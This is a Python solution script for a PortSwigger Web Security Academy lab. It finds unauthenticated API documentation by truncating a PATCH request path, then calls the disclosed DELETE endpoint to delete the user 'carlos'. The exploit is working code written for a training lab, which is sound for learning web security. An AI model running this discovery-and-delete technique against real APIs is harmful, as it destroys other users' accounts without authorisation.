# Lab 01 — Exploiting an API endpoint using documentation
# PortSwigger: https://portswigger.net/web-security/api-testing/lab-exploiting-api-endpoint-using-documentation
#
# Vulnerability: API documentation is publicly accessible with no authentication,
#                disclosing a DELETE endpoint never exposed in the UI
# Aim:           Find the exposed API documentation and delete carlos
#
# Technique:
#   Updating your email sends PATCH /api/user/wiener. Truncating the path of
#   that SAME request one segment at a time reveals more of the API's
#   structure — eventually landing on the API's self-hosted documentation.
#
#     PATCH /api/user/wiener  → 200 OK (normal update)
#     PATCH /api/user         → error: no user identifier
#     PATCH /api              → returns API documentation
#
#   The documentation discloses DELETE /api/user/{username} — call it directly.
#
# Usage: python api_testing_lab01.py <url>

import sys
import urllib3
from proxies import proxies
from api_testing_utils import banner, section, make_session, login, check_status, pretty_json, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if __name__ == "__main__":
    banner()
    section("LAB 01 — EXPLOITING AN API ENDPOINT USING DOCUMENTATION")

    if len(sys.argv) != 2:
        print("  Usage: python api_testing_lab01.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    if not login(session, url):
        sys.exit(1)

    # ── Step 1: send the normal email-update PATCH request ──────────────────
    print("\n  ── Step 1: confirm the baseline PATCH /api/user/wiener request\n")
    r1 = session.patch(f"{url}/api/user/wiener", json={"email": "wiener@example.com"})
    check_status(r1, 200, "PATCH /api/user/wiener")

    # ── Step 2: truncate the path — remove the username segment ─────────────
    print("\n  ── Step 2: truncate to /api/user (remove the username)\n")
    r2 = session.patch(f"{url}/api/user", json={"email": "wiener@example.com"})
    print(f"  ℹ  Status: {r2.status_code}")
    print_box("Response", r2.text[:300])

    # ── Step 3: truncate further — just /api ─────────────────────────────────
    print("  ── Step 3: truncate to /api — expect API documentation\n")
    r3 = session.patch(f"{url}/api", json={"email": "wiener@example.com"})
    print(f"  ℹ  Status: {r3.status_code}")
    print_box("API documentation (truncated)", pretty_json(r3)[:1500])

    if "delete" not in r3.text.lower() and "DELETE" not in r3.text:
        print("  ?  DELETE endpoint not obviously visible — also try a plain GET /api")
        r3b = session.get(f"{url}/api")
        print_box("GET /api response (truncated)", pretty_json(r3b)[:1500])

    # ── Step 4: exploit the disclosed DELETE endpoint ─────────────────────────
    print("  ── Step 4: call the disclosed DELETE /api/user/{username} endpoint\n")
    r4 = session.delete(f"{url}/api/user/carlos")
    check_status(r4, [200, 204], "DELETE /api/user/carlos")

    print()
    print("  ℹ  The documentation was reachable with no authentication at all,")
    print("     and disclosed functionality (DELETE) the UI never exposes.")
